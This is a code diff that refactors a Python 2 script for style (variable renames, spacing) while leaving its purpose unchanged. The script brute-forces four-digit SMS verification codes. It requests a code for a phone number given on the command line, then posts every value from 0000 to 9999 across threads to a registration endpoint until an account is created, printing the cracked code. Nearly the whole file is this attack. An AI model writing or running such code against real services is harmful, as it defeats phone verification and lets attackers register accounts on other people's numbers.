@@ -7,9 +7,8 @@ import requests
 import Queue
 import json
 import sys
-import re
 
-#
+
 def bThread(realcode):
     
     threadl = []
@@ -25,7 +24,7 @@ def bThread(realcode):
     for t in threadl:
         t.join()        
 
-#create thread
+
 class tThread(threading.Thread):
     def __init__(self, queue):
         threading.Thread.__init__(self)
@@ -40,9 +39,10 @@ class tThread(threading.Thread):
             except:
                 continue
 
-def trackIt():
-    regPhone = sys.argv[1]
-    url = 'http://123123.com/fetchVerifyCode&phone=' + regPhone
+
+def track_it():
+    reg_phone = sys.argv[1]
+    url = 'http://123123.com/fetchVerifyCode&phone=%s' % reg_phone
     header = {
         "Host": "*.*.*.*:80",
         "uid": "",
@@ -55,11 +55,11 @@ def trackIt():
         "Connection": "close"
     }
     try:
-        req = requests.get(url = url,headers = header,timeout = 5)
+        req = requests.get(url=url, headers=header, timeout=5)
         result = req.content
-        jsonData = json.loads(result)
+        json_data = json.loads(result)
 
-        if jsonData['code'] == 0:
+        if json_data['code'] == 0:
             print '[*] 短信发送成功'
             createCode()
         else:
@@ -68,12 +68,13 @@ def trackIt():
     except Exception,e:
         print e
 
+
 def createCode():
     print '[*] 开始爆破验证码'
 
     realcode = []
 
-    for code in range(0,10000):
+    for code in range(0, 10000):
         if len(str(code)) == 1:
             realcode.append('000' + str(code))
         if len(str(code)) == 2:
@@ -88,6 +89,7 @@ def createCode():
     except KeyboardInterrupt:
         print 'Keyboard Interrupt!'
         sys.exit()
+
 
 def doReg(code):
     url = 'http://11111.com/userRegister'
@@ -105,19 +107,16 @@ def doReg(code):
         "Cookie": "JSESSIONID=(null)"
     }
 
-    params = {"password":"21218CCA77804D2BA1922C33E0151105","phone":sys.argv[1],"verifyCode":code}
+    params = {"password": "21218CCA77804D2BA1922C33E0151105", "phone": sys.argv[1], "verifyCode": code}
 
     try:
-        req = requests.post(url = url,headers = header,data = params,timeout = 5)
-        result = req.content
-        jsonData = json.loads(result)
+        json_data = json.loads(requests.post(url=url, headers=header, data=params, timeout=5).text)
 
-        if jsonData['code'] == 0:
+        if json_data['code'] == 0:
             print '[*] 注册成功'
-            sys.exit('[*] 爆破验证码为'+code)
-
-    except Exception,e:
+            sys.exit('[*] 爆破验证码为' + code)
+    except Exception, e:
         print e
 
 if __name__ == '__main__':
-    trackIt()
+    track_it()
